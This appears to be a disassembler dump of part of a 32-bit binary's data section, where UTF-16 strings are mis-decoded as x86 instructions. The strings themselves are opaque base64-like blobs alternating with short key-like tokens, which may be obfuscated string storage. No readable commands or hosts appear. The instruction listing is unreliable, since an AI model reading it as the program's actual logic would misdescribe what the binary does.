10003bbf:	4e                   	dec    %esi
10003bc0:	00 47 00             	add    %al,0x0(%edi)
10003bc3:	52                   	push   %edx
10003bc4:	00 76 00             	add    %dh,0x0(%esi)
10003bc7:	4d                   	dec    %ebp
10003bc8:	00 57 00             	add    %dl,0x0(%edi)
10003bcb:	78 00                	js     0x10003bcd
10003bcd:	72 00                	jb     0x10003bcf
10003bcf:	56                   	push   %esi
10003bd0:	00 30                	add    %dh,(%eax)
10003bd2:	00 5a 00             	add    %bl,0x0(%edx)
10003bd5:	4f                   	dec    %edi
10003bd6:	00 4d 00             	add    %cl,0x0(%ebp)
10003bd9:	44                   	inc    %esp
10003bda:	00 52 00             	add    %dl,0x0(%edx)
10003bdd:	6b 00 62             	imul   $0x62,(%eax),%eax
10003be0:	00 7a 00             	add    %bh,0x0(%edx)
10003be3:	46                   	inc    %esi
10003be4:	00 73 00             	add    %dh,0x0(%ebx)
10003be7:	61                   	popa
10003be8:	00 31                	add    %dh,(%ecx)
10003bea:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003bee:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
10003bf2:	00 4e 00             	add    %cl,0x0(%esi)
10003bf5:	4b                   	dec    %ebx
10003bf6:	00 62 00             	add    %ah,0x0(%edx)
10003bf9:	44                   	inc    %esp
10003bfa:	00 41 00             	add    %al,0x0(%ecx)
10003bfd:	30 00                	xor    %al,(%eax)
10003bff:	5a                   	pop    %edx
10003c00:	00 47 00             	add    %al,0x0(%edi)
10003c03:	38 00                	cmp    %al,(%eax)
10003c05:	78 00                	js     0x10003c07
10003c07:	62 00                	bound  %eax,(%eax)
10003c09:	47                   	inc    %edi
10003c0a:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
10003c0e:	00 52 00             	add    %dl,0x0(%edx)
10003c11:	6b 00 34             	imul   $0x34,(%eax),%eax
10003c14:	00 77 00             	add    %dh,0x0(%edi)
10003c17:	4e                   	dec    %esi
10003c18:	00 47 00             	add    %al,0x0(%edi)
10003c1b:	52                   	push   %edx
10003c1c:	00 76 00             	add    %dh,0x0(%esi)
10003c1f:	4d                   	dec    %ebp
10003c20:	00 57 00             	add    %dl,0x0(%edi)
10003c23:	78 00                	js     0x10003c25
10003c25:	72 00                	jb     0x10003c27
10003c27:	56                   	push   %esi
10003c28:	00 30                	add    %dh,(%eax)
10003c2a:	00 5a 00             	add    %bl,0x0(%edx)
10003c2d:	4f                   	dec    %edi
10003c2e:	00 57 00             	add    %dl,0x0(%edi)
10003c31:	6a 00                	push   $0x0
10003c33:	4e                   	dec    %esi
10003c34:	00 4f 00             	add    %cl,0x0(%edi)
10003c37:	4d                   	dec    %ebp
10003c38:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003c3c:	00 6b 00             	add    %ch,0x0(%ebx)
10003c3f:	62 00                	bound  %eax,(%eax)
10003c41:	7a 00                	jp     0x10003c43
10003c43:	46                   	inc    %esi
10003c44:	00 73 00             	add    %dh,0x0(%ebx)
10003c47:	61                   	popa
10003c48:	00 31                	add    %dh,(%ecx)
10003c4a:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003c4e:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
10003c52:	00 41 00             	add    %al,0x0(%ecx)
10003c55:	30 00                	xor    %al,(%eax)
10003c57:	5a                   	pop    %edx
10003c58:	00 47 00             	add    %al,0x0(%edi)
10003c5b:	38 00                	cmp    %al,(%eax)
10003c5d:	78 00                	js     0x10003c5f
10003c5f:	62 00                	bound  %eax,(%eax)
10003c61:	47                   	inc    %edi
10003c62:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
10003c66:	00 52 00             	add    %dl,0x0(%edx)
10003c69:	6b 00 35             	imul   $0x35,(%eax),%eax
10003c6c:	00 34 00             	add    %dh,(%eax,%eax,1)
10003c6f:	59                   	pop    %ecx
10003c70:	00 6b 00             	add    %ch,0x0(%ebx)
10003c73:	45                   	inc    %ebp
10003c74:	00 77 00             	add    %dh,0x0(%edi)
10003c77:	4e                   	dec    %esi
10003c78:	00 47 00             	add    %al,0x0(%edi)
10003c7b:	52                   	push   %edx
10003c7c:	00 76 00             	add    %dh,0x0(%esi)
10003c7f:	4d                   	dec    %ebp
10003c80:	00 57 00             	add    %dl,0x0(%edi)
10003c83:	78 00                	js     0x10003c85
10003c85:	72 00                	jb     0x10003c87
10003c87:	56                   	push   %esi
10003c88:	00 30                	add    %dh,(%eax)
10003c8a:	00 5a 00             	add    %bl,0x0(%edx)
10003c8d:	4f                   	dec    %edi
10003c8e:	00 4d 00             	add    %cl,0x0(%ebp)
10003c91:	44                   	inc    %esp
10003c92:	00 52 00             	add    %dl,0x0(%edx)
10003c95:	6b 00 62             	imul   $0x62,(%eax),%eax
10003c98:	00 7a 00             	add    %bh,0x0(%edx)
10003c9b:	46                   	inc    %esi
10003c9c:	00 73 00             	add    %dh,0x0(%ebx)
10003c9f:	61                   	popa
10003ca0:	00 31                	add    %dh,(%ecx)
10003ca2:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003ca6:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
10003caa:	00 30                	add    %dh,(%eax)
10003cac:	00 39                	add    %bh,(%ecx)
10003cae:	00 4d 00             	add    %cl,0x0(%ebp)
10003cb1:	44                   	inc    %esp
10003cb2:	00 52 00             	add    %dl,0x0(%edx)
10003cb5:	6b 00 62             	imul   $0x62,(%eax),%eax
10003cb8:	00 7a 00             	add    %bh,0x0(%edx)
10003cbb:	46                   	inc    %esi
10003cbc:	00 73 00             	add    %dh,0x0(%ebx)
10003cbf:	61                   	popa
10003cc0:	00 31                	add    %dh,(%ecx)
10003cc2:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
10003cc6:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003cca:	00 3d 00 3d 00 00    	add    %bh,0x3d00
10003cd0:	15 30 00 34 00       	adc    $0x340030,%eax
10003cd5:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10003cd9:	31 00                	xor    %eax,(%eax)
10003cdb:	6c                   	insb   (%dx),%es:(%edi)
10003cdc:	00 6b 00             	add    %ch,0x0(%ebx)
10003cdf:	57                   	push   %edi
10003ce0:	00 46 00             	add    %al,0x0(%esi)
10003ce3:	4e                   	dec    %esi
10003ce4:	00 00                	add    %al,(%eax)
10003ce6:	81 b1 61 00 6e 00 64 	xorl   $0x340064,0x6e0061(%ecx)
10003ced:	00 34 00 
10003cf0:	54                   	push   %esp
10003cf1:	00 6d 00             	add    %ch,0x0(%ebp)
10003cf4:	52                   	push   %edx
10003cf5:	00 33                	add    %dh,(%ebx)
10003cf7:	00 63 00             	add    %ah,0x0(%ebx)
10003cfa:	6a 00                	push   $0x0
10003cfc:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10003d00:	53                   	push   %ebx
10003d01:	00 56 00             	add    %dl,0x0(%esi)
10003d04:	6c                   	insb   (%dx),%es:(%edi)
10003d05:	00 59 00             	add    %bl,0x0(%ecx)
10003d08:	54                   	push   %esp
10003d09:	00 6d 00             	add    %ch,0x0(%ebp)
10003d0c:	70 00                	jo     0x10003d0e
10003d0e:	33 00                	xor    (%eax),%eax
10003d10:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003d14:	35 00 6b 00 64       	xor    $0x64006b00,%eax
10003d19:	00 33                	add    %dh,(%ebx)
10003d1b:	00 49 00             	add    %cl,0x0(%ecx)
10003d1e:	33 00                	xor    (%eax),%eax
10003d20:	5a                   	pop    %edx
10003d21:	00 30                	add    %dh,(%eax)
10003d23:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
10003d27:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
10003d2b:	00 68 00             	add    %ch,0x0(%eax)
10003d2e:	4f                   	dec    %edi
10003d2f:	00 5a 00             	add    %bl,0x0(%edx)
10003d32:	48                   	dec    %eax
10003d33:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
10003d37:	00 4e 00             	add    %cl,0x0(%esi)
10003d3a:	32 00                	xor    (%eax),%al
10003d3c:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
10003d40:	64 00 32             	add    %dh,%fs:(%edx)
10003d43:	00 4a 00             	add    %cl,0x0(%edx)
10003d46:	74 00                	je     0x10003d48
10003d48:	61                   	popa
10003d49:	00 6e 00             	add    %ch,0x0(%esi)
10003d4c:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
10003d50:	54                   	push   %esp
10003d51:	00 6d 00             	add    %ch,0x0(%ebp)
10003d54:	52                   	push   %edx
10003d55:	00 33                	add    %dh,(%ebx)
10003d57:	00 63 00             	add    %ah,0x0(%ebx)
10003d5a:	6a 00                	push   $0x0
10003d5c:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10003d60:	53                   	push   %ebx
10003d61:	00 57 00             	add    %dl,0x0(%edi)
10003d64:	70 00                	jo     0x10003d66
10003d66:	33 00                	xor    (%eax),%eax
10003d68:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003d6c:	35 00 6b 00 64       	xor    $0x64006b00,%eax
10003d71:	00 33                	add    %dh,(%ebx)
10003d73:	00 49 00             	add    %cl,0x0(%ecx)
10003d76:	33 00                	xor    (%eax),%eax
10003d78:	5a                   	pop    %edx
10003d79:	00 30                	add    %dh,(%eax)
10003d7b:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
10003d7f:	00 4d 00             	add    %cl,0x0(%ebp)
10003d82:	46                   	inc    %esi
10003d83:	00 68 00             	add    %ch,0x0(%eax)
10003d86:	71 00                	jno    0x10003d88
10003d88:	64 00 33             	add    %dh,%fs:(%ebx)
10003d8b:	00 68 00             	add    %ch,0x0(%eax)
10003d8e:	4f                   	dec    %edi
10003d8f:	00 5a 00             	add    %bl,0x0(%edx)
10003d92:	48                   	dec    %eax
10003d93:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
10003d97:	00 4e 00             	add    %cl,0x0(%esi)
10003d9a:	32 00                	xor    (%eax),%al
10003d9c:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
10003da0:	61                   	popa
10003da1:	00 6e 00             	add    %ch,0x0(%esi)
10003da4:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
10003da8:	54                   	push   %esp
10003da9:	00 6d 00             	add    %ch,0x0(%ebp)
10003dac:	52                   	push   %edx
10003dad:	00 33                	add    %dh,(%ebx)
10003daf:	00 63 00             	add    %ah,0x0(%ebx)
10003db2:	6a 00                	push   $0x0
10003db4:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10003db8:	53                   	push   %ebx
10003db9:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003dbd:	00 4f 00             	add    %cl,0x0(%edi)
10003dc0:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003dc4:	70 00                	jo     0x10003dc6
10003dc6:	33 00                	xor    (%eax),%eax
10003dc8:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003dcc:	35 00 6b 00 64       	xor    $0x64006b00,%eax
10003dd1:	00 33                	add    %dh,(%ebx)
10003dd3:	00 49 00             	add    %cl,0x0(%ecx)
10003dd6:	33 00                	xor    (%eax),%eax
10003dd8:	5a                   	pop    %edx
10003dd9:	00 30                	add    %dh,(%eax)
10003ddb:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
10003ddf:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
10003de3:	00 68 00             	add    %ch,0x0(%eax)
10003de6:	4f                   	dec    %edi
10003de7:	00 5a 00             	add    %bl,0x0(%edx)
10003dea:	48                   	dec    %eax
10003deb:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
10003def:	00 4e 00             	add    %cl,0x0(%esi)
10003df2:	32 00                	xor    (%eax),%al
10003df4:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
10003df8:	59                   	pop    %ecx
10003df9:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10003dfd:	00 43 00             	add    %al,0x0(%ebx)
10003e00:	61                   	popa
10003e01:	00 6e 00             	add    %ch,0x0(%esi)
10003e04:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
10003e08:	54                   	push   %esp
10003e09:	00 6d 00             	add    %ch,0x0(%ebp)
10003e0c:	52                   	push   %edx
10003e0d:	00 33                	add    %dh,(%ebx)
10003e0f:	00 63 00             	add    %ah,0x0(%ebx)
10003e12:	6a 00                	push   $0x0
10003e14:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10003e18:	53                   	push   %ebx
10003e19:	00 57 00             	add    %dl,0x0(%edi)
10003e1c:	70 00                	jo     0x10003e1e
10003e1e:	33 00                	xor    (%eax),%eax
10003e20:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003e24:	35 00 6b 00 64       	xor    $0x64006b00,%eax
10003e29:	00 33                	add    %dh,(%ebx)
10003e2b:	00 49 00             	add    %cl,0x0(%ecx)
10003e2e:	33 00                	xor    (%eax),%eax
10003e30:	5a                   	pop    %edx
10003e31:	00 30                	add    %dh,(%eax)
10003e33:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
10003e37:	00 59 00             	add    %bl,0x0(%ecx)
10003e3a:	6b 00 64             	imul   $0x64,(%eax),%eax
10003e3d:	00 71 00             	add    %dh,0x0(%ecx)
10003e40:	64 00 33             	add    %dh,%fs:(%ebx)
10003e43:	00 68 00             	add    %ch,0x0(%eax)
10003e46:	4f                   	dec    %edi
10003e47:	00 5a 00             	add    %bl,0x0(%edx)
10003e4a:	48                   	dec    %eax
10003e4b:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
10003e4f:	00 4e 00             	add    %cl,0x0(%esi)
10003e52:	32 00                	xor    (%eax),%al
10003e54:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
10003e58:	61                   	popa
10003e59:	00 6e 00             	add    %ch,0x0(%esi)
10003e5c:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
10003e60:	54                   	push   %esp
10003e61:	00 6d 00             	add    %ch,0x0(%ebp)
10003e64:	52                   	push   %edx
10003e65:	00 33                	add    %dh,(%ebx)
10003e67:	00 63 00             	add    %ah,0x0(%ebx)
10003e6a:	6a 00                	push   $0x0
10003e6c:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10003e70:	53                   	push   %ebx
10003e71:	00 56 00             	add    %dl,0x0(%esi)
10003e74:	5a                   	pop    %edx
10003e75:	00 35 00 61 00 6e    	add    %dh,0x6e006100
10003e7b:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
10003e7f:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
10003e83:	00 52 00             	add    %dl,0x0(%edx)
10003e86:	33 00                	xor    (%eax),%eax
10003e88:	63 00                	arpl   %eax,(%eax)
10003e8a:	6a 00                	push   $0x0
10003e8c:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10003e90:	53                   	push   %ebx
10003e91:	00 51 00             	add    %dl,0x0(%ecx)
10003e94:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10003e99:	15 6a 00 77 00       	adc    $0x77006a,%eax
10003e9e:	78 00                	js     0x10003ea0
10003ea0:	4e                   	dec    %esi
10003ea1:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
10003ea5:	00 72 00             	add    %dh,0x0(%edx)
10003ea8:	37                   	aaa
10003ea9:	00 67 00             	add    %ah,0x0(%edi)
10003eac:	49                   	dec    %ecx
10003ead:	00 00                	add    %al,(%eax)
10003eaf:	80 b9 55 00 7a 00 46 	cmpb   $0x46,0x7a0055(%ecx)
10003eb6:	00 36                	add    %dh,(%esi)
10003eb8:	00 4e 00             	add    %cl,0x0(%esi)
10003ebb:	6e                   	outsb  %ds:(%esi),(%dx)
10003ebc:	00 6b 00             	add    %ch,0x0(%ebx)
10003ebf:	30 00                	xor    %al,(%eax)
10003ec1:	61                   	popa
10003ec2:	00 47 00             	add    %al,0x0(%edi)
10003ec5:	56                   	push   %esi
10003ec6:	00 33                	add    %dh,(%ebx)
10003ec8:	00 53 00             	add    %dl,0x0(%ebx)
10003ecb:	56                   	push   %esi
10003ecc:	00 56 00             	add    %dl,0x0(%esi)
10003ecf:	74 00                	je     0x10003ed1
10003ed1:	56                   	push   %esi
10003ed2:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
10003ed6:	00 78 00             	add    %bh,0x0(%eax)
10003ed9:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
10003edd:	5a                   	pop    %edx
10003ede:	00 35 00 4e 00 47    	add    %dh,0x47004e00
10003ee4:	00 68 00             	add    %ch,0x0(%eax)
10003ee7:	6c                   	insb   (%dx),%es:(%edi)
10003ee8:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
10003eec:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
10003ef0:	00 4d 00             	add    %cl,0x0(%ebp)
10003ef3:	58                   	pop    %eax
10003ef4:	00 6f 00             	add    %ch,0x0(%edi)
10003ef7:	32 00                	xor    (%eax),%al
10003ef9:	65 00 54 00 52       	add    %dl,%gs:0x52(%eax,%eax,1)
10003efe:	00 6f 00             	add    %ch,0x0(%edi)
10003f01:	5a                   	pop    %edx
10003f02:	00 58 00             	add    %bl,0x0(%eax)
10003f05:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
10003f09:	62 00                	bound  %eax,(%eax)
10003f0b:	6c                   	insb   (%dx),%es:(%edi)
10003f0c:	00 46 00             	add    %al,0x0(%esi)
10003f0f:	59                   	pop    %ecx
10003f10:	00 55 00             	add    %dl,0x0(%ebp)
10003f13:	7a 00                	jp     0x10003f15
10003f15:	46                   	inc    %esi
10003f16:	00 36                	add    %dh,(%esi)
10003f18:	00 4e 00             	add    %cl,0x0(%esi)
10003f1b:	6e                   	outsb  %ds:(%esi),(%dx)
10003f1c:	00 6b 00             	add    %ch,0x0(%ebx)
10003f1f:	30 00                	xor    %al,(%eax)
10003f21:	61                   	popa
10003f22:	00 47 00             	add    %al,0x0(%edi)
10003f25:	56                   	push   %esi
10003f26:	00 33                	add    %dh,(%ebx)
10003f28:	00 53 00             	add    %dl,0x0(%ebx)
10003f2b:	56                   	push   %esi
10003f2c:	00 4d 00             	add    %cl,0x0(%ebp)
10003f2f:	78 00                	js     0x10003f31
10003f31:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
10003f35:	5a                   	pop    %edx
10003f36:	00 35 00 4e 00 47    	add    %dh,0x47004e00
10003f3c:	00 68 00             	add    %ch,0x0(%eax)
10003f3f:	6c                   	insb   (%dx),%es:(%edi)
10003f40:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
10003f44:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003f48:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
10003f4c:	00 4d 00             	add    %cl,0x0(%ebp)
10003f4f:	78 00                	js     0x10003f51
10003f51:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
10003f55:	5a                   	pop    %edx
10003f56:	00 35 00 4e 00 47    	add    %dh,0x47004e00
10003f5c:	00 68 00             	add    %ch,0x0(%eax)
10003f5f:	6c                   	insb   (%dx),%es:(%edi)
10003f60:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
10003f64:	00 6b 00             	add    %ch,0x0(%ebx)
10003f67:	3d 00 00 15 53       	cmp    $0x53150000,%eax
10003f6c:	00 31                	add    %dh,(%ecx)
10003f6e:	00 7a 00             	add    %bh,0x0(%edx)
10003f71:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
10003f75:	34 00                	xor    $0x0,%al
10003f77:	68 00 65 00 77       	push   $0x77006500
10003f7c:	00 49 00             	add    %cl,0x0(%ecx)
10003f7f:	00 80 b9 54 00 32    	add    %al,0x320054b9(%eax)
10003f85:	00 31                	add    %dh,(%ecx)
10003f87:	00 30                	add    %dh,(%eax)
10003f89:	00 62 00             	add    %ah,0x0(%edx)
10003f8c:	54                   	push   %esp
10003f8d:	00 67 00             	add    %ah,0x0(%edi)
10003f90:	31 00                	xor    %eax,(%eax)
10003f92:	52                   	push   %edx
10003f93:	00 58 00             	add    %bl,0x0(%eax)
10003f96:	4e                   	dec    %esi
10003f97:	00 79 00             	add    %bh,0x0(%ecx)
10003f9a:	4e                   	dec    %esi
10003f9b:	00 32                	add    %dh,(%edx)
10003f9d:	00 46 00             	add    %al,0x0(%esi)
10003fa0:	58                   	pop    %eax
10003fa1:	00 65 00             	add    %ah,0x0(%ebp)
10003fa4:	45                   	inc    %ebp
10003fa5:	00 39                	add    %bh,(%ecx)
10003fa7:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
10003fab:	00 47 00             	add    %al,0x0(%edi)
10003fae:	30 00                	xor    %al,(%eax)
10003fb0:	34 00                	xor    $0x0,%al
10003fb2:	4e                   	dec    %esi
10003fb3:	00 55 00             	add    %dl,0x0(%ebp)
10003fb6:	56                   	push   %esi
10003fb7:	00 7a 00             	add    %bh,0x0(%edx)
10003fba:	63 00                	arpl   %eax,(%eax)
10003fbc:	6a 00                	push   $0x0
10003fbe:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
10003fc2:	62 00                	bound  %eax,(%eax)
10003fc4:	58                   	pop    %eax
10003fc5:	00 52 00             	add    %dl,0x0(%edx)
10003fc8:	74 00                	je     0x10003fca
10003fca:	4f                   	dec    %edi
10003fcb:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10003fcf:	00 46 00             	add    %al,0x0(%esi)
10003fd2:	63 00                	arpl   %eax,(%eax)
10003fd4:	33 00                	xor    (%eax),%eax
10003fd6:	49                   	dec    %ecx
10003fd7:	00 33                	add    %dh,(%ebx)
10003fd9:	00 61 00             	add    %ah,0x0(%ecx)
10003fdc:	47                   	inc    %edi
10003fdd:	00 4d 00             	add    %cl,0x0(%ebp)
10003fe0:	79 00                	jns    0x10003fe2
10003fe2:	54                   	push   %esp
10003fe3:	00 32                	add    %dh,(%edx)
10003fe5:	00 31                	add    %dh,(%ecx)
10003fe7:	00 30                	add    %dh,(%eax)
10003fe9:	00 62 00             	add    %ah,0x0(%edx)
10003fec:	54                   	push   %esp
10003fed:	00 67 00             	add    %ah,0x0(%edi)
10003ff0:	31 00                	xor    %eax,(%eax)
10003ff2:	52                   	push   %edx
10003ff3:	00 58 00             	add    %bl,0x0(%eax)
10003ff6:	4e                   	dec    %esi
10003ff7:	00 79 00             	add    %bh,0x0(%ecx)
10003ffa:	4e                   	dec    %esi
10003ffb:	00 30                	add    %dh,(%eax)
10003ffd:	00 39                	add    %bh,(%ecx)
10003fff:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
10004003:	00 47 00             	add    %al,0x0(%edi)
10004006:	30 00                	xor    %al,(%eax)
10004008:	34 00                	xor    $0x0,%al
1000400a:	4e                   	dec    %esi
1000400b:	00 55 00             	add    %dl,0x0(%ebp)
1000400e:	56                   	push   %esi
1000400f:	00 7a 00             	add    %bh,0x0(%edx)
10004012:	63 00                	arpl   %eax,(%eax)
10004014:	6a 00                	push   $0x0
10004016:	63 00                	arpl   %eax,(%eax)
10004018:	77 00                	ja     0x1000401a
1000401a:	50                   	push   %eax
1000401b:	00 55 00             	add    %dl,0x0(%ebp)
1000401e:	39 00                	cmp    %eax,(%eax)
10004020:	74 00                	je     0x10004022
10004022:	64 00 47 00          	add    %al,%fs:0x0(%edi)
10004026:	30 00                	xor    %al,(%eax)
10004028:	34 00                	xor    $0x0,%al
1000402a:	4e                   	dec    %esi
1000402b:	00 55 00             	add    %dl,0x0(%ebp)
1000402e:	56                   	push   %esi
1000402f:	00 7a 00             	add    %bh,0x0(%edx)
10004032:	63 00                	arpl   %eax,(%eax)
10004034:	6a 00                	push   $0x0
10004036:	63 00                	arpl   %eax,(%eax)
10004038:	3d 00 00 15 4f       	cmp    $0x4f150000,%eax
1000403d:	00 6d 00             	add    %ch,0x0(%ebp)
10004040:	74 00                	je     0x10004042
10004042:	6d                   	insl   (%dx),%es:(%edi)
10004043:	00 38                	add    %bh,(%eax)
10004045:	00 35 00 45 00 73    	add    %dh,0x73004500
1000404b:	00 72 00             	add    %dh,0x0(%edx)
1000404e:	37                   	aaa
1000404f:	00 00                	add    %al,(%eax)
10004051:	80 f9 55             	cmp    $0x55,%cl
10004054:	00 30                	add    %dh,(%eax)
10004056:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
1000405a:	00 61 00             	add    %ah,0x0(%ecx)
1000405d:	57                   	push   %edi
1000405e:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
10004062:	00 63 00             	add    %ah,0x0(%ebx)
10004065:	30 00                	xor    %al,(%eax)
10004067:	4e                   	dec    %esi
10004068:	00 4d 00             	add    %cl,0x0(%ebp)
1000406b:	63 00                	arpl   %eax,(%eax)
1000406d:	6c                   	insb   (%dx),%es:(%edi)
1000406e:	00 46 00             	add    %al,0x0(%esi)
10004071:	59                   	pop    %ecx
10004072:	00 51 00             	add    %dl,0x0(%ecx)
10004075:	6c                   	insb   (%dx),%es:(%edi)
10004076:	00 4e 00             	add    %cl,0x0(%esi)
10004079:	48                   	dec    %eax
1000407a:	00 55 00             	add    %dl,0x0(%ebp)
1000407d:	47                   	inc    %edi
1000407e:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
10004082:	00 5a 00             	add    %bl,0x0(%edx)
10004085:	6e                   	outsb  %ds:(%esi),(%dx)
10004086:	00 4e 00             	add    %cl,0x0(%esi)
10004089:	44                   	inc    %esp
1000408a:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
1000408e:	00 4a 00             	add    %cl,0x0(%edx)
10004091:	54                   	push   %esp
10004092:	00 52 00             	add    %dl,0x0(%edx)
10004095:	31 00                	xor    %eax,(%eax)
10004097:	42                   	inc    %edx
10004098:	00 70 00             	add    %dh,0x0(%eax)
1000409b:	61                   	popa
1000409c:	00 57 00             	add    %dl,0x0(%edi)
1000409f:	5a                   	pop    %edx
100040a0:	00 7a 00             	add    %bh,0x0(%edx)
100040a3:	51                   	push   %ecx
100040a4:	00 30                	add    %dh,(%eax)
100040a6:	00 78 00             	add    %bh,0x0(%eax)
100040a9:	79 00                	jns    0x100040ab
100040ab:	64 00 31             	add    %dh,%fs:(%ecx)
100040ae:	00 52 00             	add    %dl,0x0(%edx)
100040b1:	48                   	dec    %eax
100040b2:	00 55 00             	add    %dl,0x0(%ebp)
100040b5:	30 00                	xor    %al,(%eax)
100040b7:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
100040bb:	61                   	popa
100040bc:	00 57 00             	add    %dl,0x0(%edi)
100040bf:	6c                   	insb   (%dx),%es:(%edi)
100040c0:	00 6d 00             	add    %ch,0x0(%ebp)
100040c3:	63 00                	arpl   %eax,(%eax)
100040c5:	30 00                	xor    %al,(%eax)
100040c7:	4e                   	dec    %esi
100040c8:	00 4d 00             	add    %cl,0x0(%ebp)
100040cb:	63 00                	arpl   %eax,(%eax)
100040cd:	6c                   	insb   (%dx),%es:(%edi)
100040ce:	00 4e 00             	add    %cl,0x0(%esi)
100040d1:	48                   	dec    %eax
100040d2:	00 55 00             	add    %dl,0x0(%ebp)
100040d5:	47                   	inc    %edi
100040d6:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
100040da:	00 5a 00             	add    %bl,0x0(%edx)
100040dd:	6e                   	outsb  %ds:(%esi),(%dx)
100040de:	00 4e 00             	add    %cl,0x0(%esi)
100040e1:	44                   	inc    %esp
100040e2:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
100040e6:	00 4a 00             	add    %cl,0x0(%edx)
100040e9:	47                   	inc    %edi
100040ea:	00 4d 00             	add    %cl,0x0(%ebp)
100040ed:	57                   	push   %edi
100040ee:	00 4a 00             	add    %cl,0x0(%edx)
100040f1:	54                   	push   %esp
100040f2:	00 52 00             	add    %dl,0x0(%edx)
100040f5:	31 00                	xor    %eax,(%eax)
100040f7:	42                   	inc    %edx
100040f8:	00 70 00             	add    %dh,0x0(%eax)
100040fb:	61                   	popa
100040fc:	00 57 00             	add    %dl,0x0(%edi)
100040ff:	5a                   	pop    %edx
10004100:	00 7a 00             	add    %bh,0x0(%edx)
10004103:	51                   	push   %ecx
10004104:	00 30                	add    %dh,(%eax)
10004106:	00 78 00             	add    %bh,0x0(%eax)
10004109:	79 00                	jns    0x1000410b
1000410b:	55                   	push   %ebp
1000410c:	00 30                	add    %dh,(%eax)
1000410e:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
10004112:	00 61 00             	add    %ah,0x0(%ecx)
10004115:	57                   	push   %edi
10004116:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
1000411a:	00 63 00             	add    %ah,0x0(%ebx)
1000411d:	30 00                	xor    %al,(%eax)
1000411f:	4e                   	dec    %esi
10004120:	00 4d 00             	add    %cl,0x0(%ebp)
10004123:	63 00                	arpl   %eax,(%eax)
10004125:	6d                   	insl   (%dx),%es:(%edi)
10004126:	00 31                	add    %dh,(%ecx)
10004128:	00 4f 00             	add    %cl,0x0(%edi)
1000412b:	62 00                	bound  %eax,(%eax)
1000412d:	31 00                	xor    %eax,(%eax)
1000412f:	4e                   	dec    %esi
10004130:	00 48 00             	add    %cl,0x0(%eax)
10004133:	55                   	push   %ebp
10004134:	00 47 00             	add    %al,0x0(%edi)
10004137:	6c                   	insb   (%dx),%es:(%edi)
10004138:	00 70 00             	add    %dh,0x0(%eax)
1000413b:	5a                   	pop    %edx
1000413c:	00 6e 00             	add    %ch,0x0(%esi)
1000413f:	4e                   	dec    %esi
10004140:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
